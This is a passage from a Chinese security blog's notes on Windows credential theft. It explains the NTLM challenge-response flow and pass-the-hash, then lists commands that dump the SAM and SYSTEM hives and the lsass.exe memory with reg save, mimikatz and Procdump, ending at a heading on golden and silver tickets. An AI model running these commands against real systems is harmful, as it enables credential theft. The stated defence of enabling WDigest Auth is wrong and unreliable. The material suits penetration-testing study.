<li>服务器用质询进行响应，包含服务器支持和同意的功能列表，最主要包含服务器产生的Challenge</li>
<li>客户端用身份验证回复质询，用户接受到3中的challenge后，用用户与challenge进行加密运算得到response，把response，username，challenge，发给服务器，response是关键，他向服务器证明客户端用户知道账号密码</li>
<li>服务器拿到身份验证后，用challenge和hash进行加密得到response2与身份验证发来的response进行比较，如果用户hash在域控里，如果没有用户hash，没法计算response2，这个时候服务器会使用netlogon协议，联系域控，建立一个安全通道，把协商，质询，身份证验证全发给域控，这个过程叫Pass Through Authentication认证流程</li>
<li>域控使用challenge和用户hash加密得到response2，与response比较</li>
</ol>
<p>这里就可能存在一个安全问题，由于在计算response的时候，客户端是使用的用户的hash进行计算，而不是用户密码，所以我们只需要用户hash即可登录</p>
<h2 id="单机密码抓取"><a href="#单机密码抓取" class="headerlink" title="单机密码抓取"></a>单机密码抓取</h2><p>想要抓取明文或者哈希密码，必须要提权至System，本地用户名，哈希值和安全验证信息都存在SAM中，lsass.exe进程是实现Windows的安全策略(本地安全策略和登录策略) 我们可以使用工具把散列值和明文密码从内存中的lsass.exe进程或者SAM文件导出</p>
<h3 id="通过SAM和System文件抓取密码"><a href="#通过SAM和System文件抓取密码" class="headerlink" title="通过SAM和System文件抓取密码"></a>通过SAM和System文件抓取密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">无工具导出SAM文件</span><br><span class="line">	reg save hklm\sam sam.hive</span><br><span class="line">	reg save hklm\system system.hive</span><br><span class="line">	方法一:把从目标系统到处的system.hive和sam.hive与mimikatz放在同一目录下，运行mimikatz</span><br><span class="line">		lsadump::sam/sam:sam.hive /system:system.hive</span><br><span class="line">	方法二:使用mimikatz直接读取本地SAM文件，到处hash信息（需要免杀）</span><br><span class="line">		打开mimikatz</span><br><span class="line">		privilege::debug   //提升权限</span><br><span class="line">		token::elevate   //把权限提升至system</span><br><span class="line">		lsadump::sam     //读取本地SAM文件，获得NTLM Hash</span><br></pre></td></tr></table></figure>

<h3 id="使用mimikatz在线读取SAM文件"><a href="#使用mimikatz在线读取SAM文件" class="headerlink" title="使用mimikatz在线读取SAM文件"></a>使用mimikatz在线读取SAM文件</h3><p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</code></p>
<h3 id="使用mimikatz离线读取lsass-dmp文件"><a href="#使用mimikatz离线读取lsass-dmp文件" class="headerlink" title="使用mimikatz离线读取lsass.dmp文件"></a>使用mimikatz离线读取lsass.dmp文件</h3><p>Procdump是微软的工具，可以在命令行下把lsass文件导出，杀软不会报毒</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用Procdump导出lsass.dmp文件</span><br><span class="line">	Procdump.exe -accepteula -ma lsass.exe lsass.dump</span><br><span class="line">使用Procdump导出lsass.dmp文件中的密码散列值</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>防御方法:开启Wdigest Auth</p>
<h2 id="PTT-Pass-The-Ticket"><a href="#PTT-Pass-The-Ticket" class="headerlink" title="PTT(Pass The Ticket)"></a>PTT(Pass The Ticket)</h2><h3 id="黄金票据和白银票据"><a href="#黄金票据和白银票据" class="headerlink" title="黄金票据和白银票据"></a>黄金票据和白银票据</h3>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/6/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/8/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">D0gekong</span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  





  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
